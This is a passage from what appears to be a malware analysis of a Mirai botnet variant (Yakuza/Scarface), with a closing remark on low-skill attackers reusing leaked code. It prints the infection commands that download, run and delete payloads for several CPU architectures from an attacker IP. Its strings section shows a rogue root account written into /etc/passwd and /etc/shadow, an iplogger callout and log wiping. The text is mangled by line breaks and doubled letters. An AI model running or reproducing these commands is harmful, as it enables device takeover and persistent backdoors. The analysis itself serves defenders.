@@ -1,0 +1,44 @@
+
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.m68k; chmod +x Masked.m68k; ./Masked.m68k; rm -rf Masked.m68k cd /tmp || cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.sparc; chmod +x Masked.sparc; ./Masked.sparc; rm -rf Masked.sparc cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.arm4; chmod +x Masked.arm4; ./Masked.arm4; rm -rf Masked.arm4 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.arm5; chmod +x Masked.arm5; ./Masked.arm5; rm -rf Masked.arm5 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.arm7; chmod +x Masked.arm7; ./Masked.arm7; rm -rf Masked.arm7 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.ppc440fp; chmod +x Masked.ppc440fp; ./Masked.ppc440fp; rm -rf Masked.ppc440fp
+The following strings taken from the second wave of this attacker indicate this source code was taken from the Yakuza/Scarface variant of Mirai.
+(null)
+Billy BobBot/1.0 (+http://www. billy bobbot.com/crawler/)
+YakuzaBotnet Scarface1337 In the strings we can see that attacker inserting a user into /etc/passwd and /etc/shadow wwget -q –delete-after http://nexon-nx.ga/iplogger/?id 443011503 eecho system:x:0:500::/:/bin/bash >> /etc
+/passwd eecho system:’$6$ZPptHtmp$q9o5eFjUAh.
+MPmnHJbkuSNggDaq.
+A00dRgOBAW6gh7Uv7i/dOYD04.xMHQHtyhnkcMiYCrI6aB9KC4Lv.d3rx/:16601:0:99999:7:::’ >> /etc
+/shadow rrm -rf /var/log/* &> /dev/null Juniper’s ATP Cloud identifies it as Mirai variant [Trojan.
+Mirai.6981169].
+As we continue to see more and more distribution of malware code, we will see a wider spread of attackers with limited skill using exploits and code bases that they would normally not have the capabilities of developing.
+These attackers are able to use search engines and browse Github to obtain the source code and research how to make simple modifications and obfuscate their malware to appear more adept.
+Information Security professionals will continue to see Mirai for the foreseeable future and should not discount any “attacks” as trivial.
+
+
